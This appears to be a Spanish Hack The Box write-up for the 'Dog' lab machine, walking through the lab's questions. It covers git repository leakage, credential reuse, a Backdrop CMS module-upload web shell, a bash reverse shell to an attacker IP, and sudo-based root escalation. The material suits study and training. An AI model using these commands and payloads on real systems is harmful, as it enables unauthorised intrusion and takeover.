---
title: Dog
date: 2025-12-28 11:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, dog ]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/426830ea2ae4f05f7892ad89195f8276.png
    alt: Hack The Box
---

> Dog
Linux · Easy 

## Task 1

How many open TCP ports are listening on Dog?

```shell
┌──(pmartinezr㉿kali)-[~]
└─$ nmap -p- -sCVS -T 5 --min-rate 5000 10.129.26.186 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-28 10:42 CET
Nmap scan report for 10.129.26.186
Host is up (0.043s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-git: 
|   10.129.26.186:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
|_http-title: Home | Dog
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.91 seconds
```

> 2

## Task 2

What is the name of the directory on the root of the webserver that leaks the full source code of the application?

Nmap nos muestra que ha encontrado un directorio .git, presupongo que es ```.git```

> .git

## Task 3

What is the CMS used to make the website on Dog? Include a space between two words.

En el pie de página de la web aparece "Powered by Backdrop CMS"

> Backdrop CMS

## Task 4

What is the password the application uses to connect to the database?

```
0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000	commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases
```

Al navegar por este directorio podemos encontrar información interesante http://10.129.26.186/.git/logs/HEAD


``` shell
┌──(git-dumper)─(pmartinezr㉿kali)-[~/htb/dog/git-dumper]
└─$ python git_dumper.py http://10.129.26.186/.git/ ../repo
[-] Testing http://10.129.26.186/.git/HEAD [200]
[-] Testing http://10.129.26.186/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://10.129.26.186/.git/ [200]
[-] Fetching http://10.129.26.186/.gitignore [404]
```
Con [https://github.com/arthaud/git-dumper](https://github.com/arthaud/git-dumper) nos descargamos el repositorio entero 
lo que nos permite obtener ficheros tan importantes como ```settings.php```

``` shell
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
```
Una de las líneas de ```settings.php``` contiene la password de root de mysql

> BackDropJ2024DS2024

## Task 5

What user uses the DB password to log into the admin functionality of Backdrop CMS?

``` shell
┌──(git-dumper)─(pmartinezr㉿kali)-[~/htb/dog/repo]
└─$ grep -r @dog   
.git/logs/HEAD:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000        commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases
.git/logs/refs/heads/master:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000   commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases
files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
```

Al investigar un poco la web podemos ver que en apartado ```About``` aparece un usuario de soporte ```support@dog.htb```. Así que parece buena
idea buscar usuarios con el patron ```@dog```. Encontramos ```tiffany@dog.htb``` y si probamos a loguearnos en la web con la password de la base de datos encontrada podemos acceder a un Dashboard.

> tiffany

## Task 6

What system user is the Backdrop CMS instance running as on Dog?

```shell
┌──(pmartinezr㉿kali)-[~/htb/dog]
└─$ python cve.py http://10.129.26.186 tiffany BackDropJ2024DS2024
Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://10.129.26.186/admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http://10.129.26.186/modules/shell/shell.php
```
Siguiendo estas instrucciones construyo este módulo con este script de python, el cual debemos instalar manualmente
[https://www.exploit-db.com/exploits/52021](https://www.exploit-db.com/exploits/52021)

``` shell
┌──(pmartinezr㉿kali)-[~/htb/dog]
└─$ unzip shell.zip
Archive:  shell.zip
 extracting: shell/shell.info        
 extracting: shell/shell.php     

tar -cvf shell.tar.gz shell
shell/
shell/shell.tar
shell/shell.info
shell/shell.php
```
Entendiendo que este exploit se basa en que tenemos un usuario con permisos para instalar un módulo nuevo. Esto en la web
en el apartado de ```Funcionality``` y subiendo un módulo con la opción de subirlo manualmente.
Cuando intentamos subir este módulo para instalarlo parece que no le gusta otro tipo de fichero que no sea un ```tar.gz``` por lo que lo descomprimo con zip y luego lo vuelvo a comprimir con tar. 
Ahora sí podemos ver el módulo accediendo a http://10.129.26.186/modules/shell/shell.php

``` html
    <html>
    <body>
    <form method="GET" name="shell.php">
    <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
    <input type="SUBMIT" value="Execute">
    </form>
    <pre>
        </pre>
    </body>
    </html>
```
En esta shell mínima de PHP introducimos un comando ```whoami```

> www-data

## Task 7

What system user on Dog shares the same DB password?

``` shell
bash -c 'bash -i >& /dev/tcp/10.10.14.110/4444 0>&1'
```

Introducimos el payload para recibir una reverse shell en el formulario. 

``` shell
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.110:4444 
[*] Command shell session 1 opened (10.10.14.110:4444 -> 10.129.26.228:54650) at 2025-12-28 13:54:41 +0100


Shell Banner:
bash: cannot set terminal process group (1011): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dog:/var/www/html/modules/shell$
-----
          

www-data@dog:/var/www/html/modules/shell$ 
```
Conseguimos meterpreter

``` shell
www-data@dog:/home$ ls
jobert
johncusack
www-data@dog:/home$ users
users
johncusack
```

Exploramos ```/home``` y comprobamos que usuarios están registrados en el sistema

``` shell
┌──(pmartinezr㉿kali)-[~/htb/dog]
└─$ ssh johncusack@10.129.26.228
The list of available updates is more than a week old.
To check for new updates run: sudo apt update

johncusack@dog:~$ 
```

El típico caso de reutilización de passwords nos permiten con la password ```BackDropJ2024DS2024``` entrar por SSH. 

> johncusack

## Task Submit User Flag

Submit the flag located in the johncusack user's home directory.

johncusack@dog:~$ cat user.txt 
9b4a77979221c3************

> 9b4a77979221c3************

## Task 9

What is the full path of the binary that the johncusack user can run as any user on Dog?

``` shell
johncusack@dog:~$ sudo -l
[sudo] password for johncusack: 
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

> /usr/local/bin/bee

## Task 10

bee requires a root directory to run properly. What is the appropriate root directory on Dog? Include the trailing /.

``` shell
johncusack@dog:~$ ls /var/www/html/
core/         .git/         layouts/      modules/      robots.txt    sites/        
files/        index.php     LICENSE.txt   README.md     settings.php  themes/ 
```

El directorio root de la aplicación está en ```/var/www/html/```

> /var/www/html

## Task 11

What is the bee subcommand to run arbitrary PHP code?

``` shell
  eval
   ev, php-eval
   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.
```

Llama la atención que la funcion ```ev, php-eval``` puede ejecutar código php 

> eval

## Submit Root Flag

Submit the flag located in the root user's home directory.

``` shell
johncusack@dog:~$ sudo bee --root=/var/www/html eval 'system("bash");'
root@dog:/var/www/html# 

```
Haciendo uso de bee podemos lanzar un comando en el sistema con php con la función system

``` shell
root@dog:/var/www/html# cat ~/root.txt 
d6530ccb3181d929************
```

> d6530ccb3181d929************

[achivement](https://labs.hackthebox.com/achievement/machine/2336390/651)